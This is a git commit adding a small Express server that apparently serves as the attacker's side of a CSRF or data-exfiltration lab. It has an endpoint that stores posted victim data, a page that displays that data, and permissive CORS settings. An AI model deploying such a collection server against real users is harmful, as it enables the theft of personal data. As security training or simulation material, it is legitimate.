5eca2894589dfe3a9e74c75823e5da2b7d7a9bd0
Hafiz Nur Rahman <hfznrrhmn12@gmail.com>
2025-07-20 13:49:42 +0700

    upload

---
+++ server.js
@@ -0,0 +1,69 @@
+const express = require("express");
+const cors = require("cors");
+const app = express();
+const ip = "0.0.0.0";
+const port = 3000;
+
+const storedData = [];
+
+// Middleware for parsing JSON
+app.use(express.json());
+
+// ORS setup is more informative
+app.use(
+    cors({
+        origin: "*",
+        methods: ["GET", "POST", "OPTIONS"],
+        allowedHeaders: ["Content-Type", "X-CSRF-TOKEN"],
+        credentials: true
+    })
+);
+
+// log all incoming requests
+app.use((req, res, next) => {
+    console.log(
+        `[${new Date().toISOString()}] ${req.method} ${req.originalUrl}`
+    );
+    next();
+});
+
+// endpoint for receiving data
+app.post("/invitations/send", (req, res) => {
+    const data = req.body;
+
+    storedData.push(data);
+    res.status(200).json({
+        status: "success",
+        received: data,
+        info: "Data exfiltration simulation successful!"
+    });
+});
+
+// display victim data
+app.get("/victim-data", (req, res) => {
+    res.send(`
+        <h1>VICTIM DATA</h1>
+        <pre>${JSON.stringify(storedData, null, 2)}</pre>
+    `);
+});
+
+// success redirect
+app.get("/:other", (req, res) => {
+    if (req.path.endsWith("/")) {
+        res.send(`
+            <h1>Success Redirect To Attacker Site</h1>
+        `);
+    } else {
+        res.send();
+    }
+});
+
+// Homepage
+app.get("/", (req, res) => {
+    res.send("Homepage Attacker");
+});
+
+// Run server
+app.listen(port, ip, () => {
+    console.log(`Server listening on http://${ip}:${port}`);
+});
